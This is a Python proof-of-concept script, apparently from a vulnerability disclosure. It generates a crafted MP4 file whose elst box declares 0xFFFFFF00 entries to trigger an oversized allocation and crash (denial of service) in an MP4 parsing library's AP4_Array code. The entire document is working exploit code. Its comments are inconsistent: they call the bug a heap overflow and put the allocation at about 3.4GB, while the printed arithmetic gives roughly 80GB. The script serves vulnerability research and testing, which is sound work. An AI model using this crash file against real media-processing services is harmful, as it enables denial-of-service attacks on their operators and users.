#!/usr/bin/env python3
"""
PoC generator for VULN 001:
Integer Overflow in AP4_Array EnsureCapacity causing heap buffer overflow in elst parser.

Constructs a crafted MP4 with elst entry_count=0xFFFFFF00 to trigger std::bad_alloc (DoS).
"""
import struct
import os

def make_box(box_type, data):
    """Create a standard MP4 box: size(4B BE) + type(4B) + data"""
    size = 8 + len(data)
    return struct.pack('>I', size) + box_type + data

def make_full_box(box_type, version, flags, data):
    """Create a full MP4 box: size(4B BE) + type(4B) + version(1B) + flags(3B) + data"""
    size = 12 + len(data)
    return struct.pack('>I', size) + box_type + struct.pack('>B', version) + struct.pack('>I', flags)[1:] + data

# ftyp box
ftyp_data = b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom'
ftyp = make_box(b'ftyp', ftyp_data)

# mvhd (version 0): full box + 100 bytes of zeros (creation/modification time, timescale, etc.)
mvhd = make_full_box(b'mvhd', 0, 0, b'\x00' * 100)

# tkhd (version 0): full box + 92 bytes of zeros
tkhd = make_full_box(b'tkhd', 0, 0, b'\x00' * 92)

# elst (full box): version=0, flags=0, entry_count=0xFFFFFF00, NO actual entries
# entry_count=0xFFFFFF00: 0xFFFFFF00 * 20 bytes per entry ~= 3.4GB -> std::bad_alloc on 64-bit
elst_data = struct.pack('>I', 0xFFFFFF00)  # entry_count, no actual entries follow
elst = make_full_box(b'elst', 0, 0, elst_data)

# edts container box containing elst
edts = make_box(b'edts', elst)

# trak container box containing tkhd + edts
trak = make_box(b'trak', tkhd + edts)

# moov container box containing mvhd + trak
moov = make_box(b'moov', mvhd + trak)

# Final MP4 file
mp4 = ftyp + moov

# Write to file
out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001.mp4')
with open(out_path, 'wb') as f:
    f.write(mp4)

print(f"Written {len(mp4)} bytes to {out_path}")
print(f"elst entry_count = 0xFFFFFF00 ({0xFFFFFF00})")
print(f"Expected allocation: 0xFFFFFF00 * 20 = {0xFFFFFF00 * 20} bytes (~{0xFFFFFF00 * 20 / (1024**3):.1f} GB)")
